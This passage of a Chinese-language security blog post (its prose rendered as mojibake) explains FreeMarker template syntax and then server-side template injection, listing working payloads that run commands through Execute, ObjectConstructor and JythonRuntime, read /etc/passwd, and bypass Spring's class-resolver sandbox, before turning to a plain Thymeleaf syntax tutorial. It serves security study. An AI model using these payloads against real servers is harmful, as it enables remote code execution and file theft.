class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;#list ma?keys as k&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;$&#123;ma[k].name&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;ma[k].age&#125;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/#list&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><h4 id="ç©ºå€¼å¤„ç†"><a href="#ç©ºå€¼å¤„ç†" class="headerlink" title="ç©ºå€¼å¤„ç†"></a>ç©ºå€¼å¤„ç†</h4><p>?? åˆ¤æ–­æ˜¯ä¸ä¸ºç©º</p><p>${name!â€â€} name ä¸ºç©ºæ—¶ æ˜¾ç¤º â€œâ€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;#<span class="keyword">if</span> name??&gt;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;#<span class="keyword">if</span> name??&gt;</span><br><span class="line">$&#123;name!<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="FreeMarkeræ³¨å…¥"><a href="#FreeMarkeræ³¨å…¥" class="headerlink" title="FreeMarkeræ³¨å…¥"></a>FreeMarkeræ³¨å…¥</h3><h4 id="å†…ç½®å‡½æ•°"><a href="#å†…ç½®å‡½æ•°" class="headerlink" title="å†…ç½®å‡½æ•°"></a>å†…ç½®å‡½æ•°</h4><h5 id="new"><a href="#new" class="headerlink" title="new"></a>new</h5><p>å¯åˆ›å»ºä»»æ„å®ç°äº†TemplateModelæ¥å£çš„Javaå¯¹è±¡ï¼ŒåŒæ—¶è¿˜å¯ä»¥è§¦å‘æ²¡æœ‰å®ç°Â TemplateModelæ¥å£çš„ç±»çš„é™æ€åˆå§‹åŒ–å—ã€‚ä»¥ä¸‹ä¸¤ç§å¸¸è§çš„FreeMarkeræ¨¡ç‰ˆæ³¨å…¥pocå°±æ˜¯åˆ©ç”¨newå‡½æ•°ï¼Œåˆ›å»ºäº†ç»§æ‰¿TemplateModelæ¥å£çš„freemarker.template.utility.JythonRuntimeå’Œfreemarker.template.utility.Executeã€‚</p><h5 id="API"><a href="#API" class="headerlink" title="API"></a>API</h5><p>value?api æä¾›å¯¹ value çš„ APIï¼ˆé€šå¸¸æ˜¯ Java APIï¼‰çš„è®¿é—®ï¼Œä¾‹å¦‚Â value?api.someJavaMethod()Â æˆ–Â value?api.someBeanPropertyã€‚å¯é€šè¿‡Â getClassLoaderè·å–ç±»åŠ è½½å™¨ä»è€ŒåŠ è½½æ¶æ„ç±»ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥é€šè¿‡Â getResourceæ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚ä½†æ˜¯ï¼Œå½“api_builtin_enabledä¸ºtrueæ—¶æ‰å¯ä½¿ç”¨apiå‡½æ•°ï¼Œè€Œè¯¥é…ç½®åœ¨2.3.22ç‰ˆæœ¬ä¹‹åé»˜è®¤ä¸ºfalseã€‚</p><h5 id="ä¸€äº›poc1"><a href="#ä¸€äº›poc1" class="headerlink" title="ä¸€äº›poc1"></a>ä¸€äº›poc1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; </span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt; </span><br><span class="line">&lt;#assign ex=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; </span><br><span class="line">$&#123;ex(<span class="string">&quot;open -a Calculator.app&quot;</span><span class="string">&quot;)&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign value=&quot;</span>freemarker.template.utility.ObjectConstructor<span class="string">&quot;?new()&gt;$&#123;value(&quot;</span>java.lang.ProcessBuilder<span class="string">&quot;,&quot;</span>whoami<span class="string">&quot;).start()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign value=&quot;</span>freemarker.template.utility.JythonRuntime<span class="string">&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;</span>calc.exe<span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign ex=&quot;</span>freemarker.template.utility.Execute<span class="string">&quot;?new()&gt; $&#123; ex(&quot;</span>open -a Calculator.app<span class="string">&quot;) &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è¯»å–æ–‡ä»¶</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign is=object?api.class.getResourceAsStream(&quot;</span>/Test.class<span class="string">&quot;)&gt;</span></span><br><span class="line"><span class="string">FILE:[&lt;#list 0..999999999 as _&gt;</span></span><br><span class="line"><span class="string">    &lt;#assign byte=is.read()&gt;</span></span><br><span class="line"><span class="string">    &lt;#if byte == -1&gt;</span></span><br><span class="line"><span class="string">        &lt;#break&gt;</span></span><br><span class="line"><span class="string">    &lt;/#if&gt;</span></span><br><span class="line"><span class="string">$&#123;byte&#125;, &lt;/#list&gt;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;#assign uri=object?api.class.getResource(&quot;</span>/<span class="string">&quot;).toURI()&gt;</span></span><br><span class="line"><span class="string">&lt;#assign input=uri?api.create(&quot;</span>file:<span class="comment">///etc/passwd&quot;).toURL().openConnection()&gt;</span></span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¼•å…¥ç»•è¿‡æ²™ç®±çš„ä¸€äº›æ‰‹æ³•æ¥æºäºblackhatè®®é¢˜ï¼Œåœ¨æ·±è‚²æ¯æ¯”èµ›çœ‹åˆ°çš„è€ƒç‚¹ã€‚å…ˆæ¥çœ‹ä¸€ä¸‹blackhatçš„åŸpayload</p><p>æ­¤<code>payload</code>åŒæ ·å¯ç”¨äº<code>halo 1.2.0</code>ç‰ˆæœ¬</p><p>è¿™ä¸ªpayloadéœ€è¦freemarker+springå¹¶è®¾ç½®<code>setExposeSpringMacroHelpers(true)</code>æˆ–æ˜¯application.properticesä¸­é…ç½®<code>spring.freemarker.expose-spring-macro-helpers=true</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;</span><br><span class="line">&lt;#assign fc=ac.getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;</span><br><span class="line">&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>]ï¼Œå¾—åˆ°ä»¥ä¸‹payload</span><br><span class="line"></span><br><span class="line">&lt;#assign ac=Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>]&gt;</span><br><span class="line">&lt;#assign fc=ac.getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;</span><br><span class="line">&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">ç®€åŒ–ä¸€ä¸‹payload</span><br><span class="line"></span><br><span class="line">&lt;#assign fc=Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>].getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">$&#123;fc.setNewBuiltinClassResolver(fc.getDefaultConfiguration().getNewBuiltinClassResolver())&#125;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;whoami&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åŠ ä¸€äº›å…¶ä»–çš„ç»•è¿‡ï¼šæ ¹æ®Pwntester 2020å¹´çš„è®®é¢˜ <a href="https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Alvaro%20Mun%CC%83oz%20and%20Oleksandr%20Mirosh%20-%20Room%20For%20Escape%20Scribbling%20Outside%20The%20Lines%20Of%20Template%20Security.pdf">https://media.defcon.org/DEF CON 28/DEF CON Safe Mode presentations/DEF CON Safe Mode - Alvaro MunÌƒoz and Oleksandr Mirosh - Room For Escape Scribbling Outside The Lines Of Template Security.pdf</a> </p><h5 id="ç»•è¿‡class-getClassloaderåå°„åŠ è½½Executeç±»"><a href="#ç»•è¿‡class-getClassloaderåå°„åŠ è½½Executeç±»" class="headerlink" title="ç»•è¿‡class.getClassloaderåå°„åŠ è½½Executeç±»"></a>ç»•è¿‡class.getClassloaderåå°„åŠ è½½Executeç±»</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classloader=&lt;&lt;object&gt;&gt;.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign owc=classloader.loadClass(<span class="string">&quot;freemarker.template.ObjectWrapper&quot;</span>)&gt;</span><br><span class="line">&lt;#assign dwf=owc.getField(<span class="string">&quot;DEFAULT_WRAPPER&quot;</span>).get(<span class="literal">null</span>)&gt;</span><br><span class="line">&lt;#assign ec=classloader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>)&gt;</span><br><span class="line">$&#123;dwf.newInstance(ec,<span class="literal">null</span>)(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA">https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA</a></p><p><a href="https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA">https://www.cnblogs.com/nice0e3/p/16217471.htm</a></p><p><a href="https://tttang.com/archive/1412/#toc_0x03-thymeleaf">https://tttang.com/archive/1412/#toc_0x03-thymeleaf</a></p><p><a href="https://forum.butian.net/share/1661">https://forum.butian.net/share/1661</a></p><h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><p>Thymeleafæ˜¯ä¼—å¤šæ¨¡æ¿å¼•æ“çš„ä¸€ç§å’Œå…¶ä»–çš„æ¨¡æ¿å¼•æ“ç›¸æ¯”ï¼Œå®ƒæœ‰å¦‚ä¸‹ä¼˜åŠ¿ï¼š</p><ul><li>Thymeleafä½¿ç”¨htmlé€šè¿‡ä¸€äº›ç‰¹å®šæ ‡ç­¾è¯­æ³•ä»£è¡¨å…¶å«ä¹‰ï¼Œä½†å¹¶æœªç ´åhtmlç»“æ„ï¼Œå³ä½¿æ— ç½‘ç»œã€ä¸é€šè¿‡åç«¯æ¸²æŸ“ä¹Ÿèƒ½åœ¨æµè§ˆå™¨æˆåŠŸæ‰“å¼€ï¼Œå¤§å¤§æ–¹ä¾¿ç•Œé¢çš„æµ‹è¯•å’Œä¿®æ”¹ã€‚</li><li>Thymeleafæä¾›æ ‡å‡†å’ŒSpringæ ‡å‡†ä¸¤ç§æ–¹è¨€ï¼Œå¯ä»¥ç›´æ¥å¥—ç”¨æ¨¡æ¿å®ç°JSTLã€ OGNLè¡¨è¾¾å¼æ•ˆæœï¼Œé¿å…æ¯å¤©å¥—æ¨¡æ¿ã€æ”¹JSTLã€æ”¹æ ‡ç­¾çš„å›°æ‰°ã€‚åŒæ—¶å¼€å‘äººå‘˜ä¹Ÿå¯ä»¥æ‰©å±•å’Œåˆ›å»ºè‡ªå®šä¹‰çš„æ–¹è¨€ã€‚</li><li>Springbootå®˜æ–¹å¤§åŠ›æ¨èå’Œæ”¯æŒï¼ŒSpringbootå®˜æ–¹åšäº†å¾ˆå¤šé»˜è®¤é…ç½®ï¼Œå¼€å‘è€…åªéœ€ç¼–å†™å¯¹åº”htmlå³å¯ï¼Œå¤§å¤§å‡è½»äº†ä¸Šæ‰‹éš¾åº¦å’Œé…ç½®å¤æ‚åº¦ã€‚</li></ul><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/Lzy410992/article/details/115371017">https://blog.csdn.net/Lzy410992/article/details/115371017</a></p><p><a href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514?</a></p><p>æ—¢ç„¶Thymeleafä¹Ÿä½¿ç”¨çš„htmlï¼Œé‚£ä¹ˆå¦‚ä½•åŒºåˆ†å“ªäº›æ˜¯Thymeleafçš„htmlï¼Ÿ</p><p>åœ¨Thymeleafçš„htmlä¸­é¦–å…ˆè¦åŠ ä¸Šä¸‹é¢çš„æ ‡è¯†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html xmlns:th=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h4><p>Thymeleafæä¾›äº†ä¸€äº›å†…ç½®æ ‡ç­¾ï¼Œé€šè¿‡æ ‡ç­¾æ¥å®ç°ç‰¹å®šçš„åŠŸèƒ½ã€‚</p><table><thead><tr><th><strong>æ ‡ç­¾</strong></th><th><strong>ä½œç”¨</strong></th><th><strong>ç¤ºä¾‹</strong></th><th></th></tr></thead><tbody><tr><td>th:id</td><td>æ›¿æ¢id</td><td><input th:id="${user.id}"/></td><td></td></tr><tr><td>th:text</td><td>æ–‡æœ¬æ›¿æ¢</td><td><p text:="${user.name}">bigsai</p></td><td></td></tr><tr><td>th:utext</td><td>æ”¯æŒhtmlçš„æ–‡æœ¬æ›¿æ¢</td><td><p utext:="${htmlcontent}">content</p></td><td></td></tr><tr><td>th:object</td><td>æ›¿æ¢å¯¹è±¡</td><td><div th:object="${user}"></div></td><td></td></tr><tr><td>th:value</td><td>æ›¿æ¢å€¼</td><td><input th:value="${user.name}" ></td><td></td></tr><tr><td>th:each</td><td>è¿­ä»£</td><td><tr th:each="student:${user}" ></td><td></td></tr><tr><td>th:href</td><td>æ›¿æ¢è¶…é“¾æ¥</td><td><a th:href="@{index.html}">è¶…é“¾æ¥</a></td><td></td></tr><tr><td>th:src</td><td>æ›¿æ¢èµ„æº</td><td><script type="text/javascript" th:src="@{index.js}"></script></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="é“¾æ¥è¡¨è¾¾å¼"><a href="#é“¾æ¥è¡¨è¾¾å¼" class="headerlink" title="é“¾æ¥è¡¨è¾¾å¼"></a>é“¾æ¥è¡¨è¾¾å¼</h4><p><font style="color:rgb(51, 51, 51);">åœ¨Thymeleaf<br></font>ä¸­ï¼Œå¦‚æœæƒ³å¼•å…¥é“¾æ¥æ¯”å¦‚linkï¼Œhrefï¼Œsrcï¼Œéœ€è¦ä½¿ç”¨@{èµ„æºåœ°å€}å¼•å…¥èµ„æºã€‚å¼•å…¥çš„åœ°å€å¯ä»¥åœ¨staticç›®å½•ä¸‹ï¼Œä¹Ÿå¯ä»¥å¸äº’è”ç½‘ä¸­çš„èµ„æºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> th:href=<span class="string">&quot;@&#123;index.css&#125;&quot;</span>&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> th:src=<span class="string">&quot;@&#123;index.js&#125;&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;a th:href=<span class="string">&quot;@&#123;index.html&#125;&quot;</span>&gt;è¶…é“¾æ¥&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="å˜é‡è¡¨è¾¾å¼"><a href="#å˜é‡è¡¨è¾¾å¼" class="headerlink" title="å˜é‡è¡¨è¾¾å¼"></a>å˜é‡è¡¨è¾¾å¼</h4><p>å¯ä»¥é€šè¿‡${â€¦}åœ¨modelä¸­å–å€¼ï¼Œå¦‚æœåœ¨Modelä¸­å­˜å‚¨å­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥é€šè¿‡${å¯¹è±¡å}ç›´æ¥å–å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//å¯¹åº”å‡½æ•°</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//æ•°æ®æ·»åŠ åˆ°modelä¸­</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bigsai&quot;</span>);<span class="comment">//æ™®é€šå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//ä¸templatesä¸­index.htmlå¯¹åº”</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;&#x27;æˆ‘çš„åå­—æ˜¯ï¼š&#x27;+$&#123;name&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure><p>å–JavaBeanå¯¹è±¡ä½¿ç”¨${å¯¹è±¡å.å¯¹è±¡å±æ€§}æˆ–è€…${å¯¹è±¡å[â€˜å¯¹è±¡å±æ€§â€™]}æ¥å–å€¼ã€‚å¦‚æœJavaBeanå†™äº†getæ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡${å¯¹è±¡.getæ–¹æ³•å}å–å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//å¯¹åº”å‡½æ•°</span></span><br><span class="line">&#123;</span><br><span class="line">user user1=<span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&quot;bigsai&quot;</span>,<span class="number">22</span>,<span class="string">&quot;ä¸€ä¸ªå¹½é»˜ä¸”çƒ­çˆ±javaçš„ç¤¾ä¼šé’å¹´&quot;</span>);</span><br><span class="line">model.addAttribute(<span class="string">&quot;user&quot;</span>,user1);<span class="comment">//å‚¨å­˜javabean</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//ä¸templatesä¸­index.htmlå¯¹åº”</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user[&#x27;age&#x27;]&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user.getDetail()&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure><p>å–Mapå¯¹è±¡ä½¿ç”¨${Mapå[â€˜keyâ€™]}æˆ–${Mapå.key}ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//é¡µé¢çš„urlåœ°å€</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//å¯¹åº”å‡½æ•°</span></span><br><span class="line">&#123;</span><br><span class="line">Map&lt;String ,String&gt;map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;place&quot;</span>,<span class="string">&quot;åšå­¦è°·&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;feeling&quot;</span>,<span class="string">&quot;very well&quot;</span>);</span><br><span class="line"><span class="comment">//æ•°æ®æ·»åŠ åˆ°modelä¸­</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;map&quot;</span>,map);<span class="comment">//å‚¨å­˜Map</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//ä¸templatesä¸­index.htmlå¯¹åº”</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;map.get(&#x27;place&#x27;)&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;map[&#x27;feeling&#x27;]&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure><p>å–Listé›†åˆï¼šListé›†åˆæ˜¯ä¸€ä¸ªæœ‰åºåˆ—è¡¨ï¼Œéœ€è¦ä½¿ç”¨eachéå†èµ‹å€¼ï¼Œ<tr th:each="item:${userlist}"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//é¡µé¢çš„urlåœ°å€</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//å¯¹åº”å‡½æ•°</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;String&gt;userList=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">userList.add(<span class="string">&quot;zhang san 66&quot;</span>);</span><br><span class="line">userList.add(<span class="string">&quot;li si 66&quot;</span>);</span><br><span class="line">userList.add(<span class="string">&quot;wang wu 66&quot;</span>);</span><br><span class="line"><span class="comment">//æ•°æ®æ·»åŠ åˆ°modelä¸­</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;userlist&quot;</span>,userList);<span class="comment">//å‚¨å­˜List</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//ä¸templatesä¸­index.htmlå¯¹åº”</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr th:each=<span class="string">&quot;item:$&#123;userlist&#125;&quot;</span>&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;item&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure><h4 id="é€‰æ‹©å˜é‡è¡¨è¾¾å¼"><a href="#é€‰æ‹©å˜é‡è¡¨è¾¾å¼" class="headerlink" title="é€‰æ‹©å˜é‡è¡¨è¾¾å¼"></a>é€‰æ‹©å˜é‡è¡¨è¾¾å¼</h4><p>å˜é‡è¡¨è¾¾å¼ä¹Ÿå¯ä»¥å†™ä¸º*{â€¦}ã€‚æ˜Ÿå·è¯­æ³•å¯¹é€‰å®šå¯¹è±¡è€Œä¸æ˜¯æ•´ä¸ªä¸Šä¸‹æ–‡è¯„ä¼°è¡¨è¾¾å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æ²¡æœ‰é€‰å®šçš„å¯¹è±¡ï¼Œç¾å…ƒ(${â€¦})å’Œæ˜Ÿå·(*{â€¦})çš„è¯­æ³•å°±å®Œå…¨ä¸€æ ·ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div th:object=<span class="string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Name: &lt;span th:text=<span class="string">&quot;*&#123;name&#125;&quot;</span>&gt;èµ›&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Age: &lt;span th:text=<span class="string">&quot;*&#123;age&#125;&quot;</span>&gt;<span class="number">18</span>&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Detail: &lt;span th:text=<span class="string">&quot;*&#123;detail&#125;&quot;</span>&gt;å¥½å¥½å­¦ä¹ &lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="æ¶ˆæ¯è¡¨è¾¾å¼"><a href="#æ¶ˆæ¯è¡¨è¾¾å¼" class="headerlink" title="æ¶ˆæ¯è¡¨è¾¾å¼"></a>æ¶ˆæ¯è¡¨è¾¾å¼</h4><p>æ–‡æœ¬å¤–éƒ¨åŒ–æ˜¯ä»æ¨¡æ¿æ–‡ä»¶ä¸­æå–æ¨¡æ¿ä»£ç 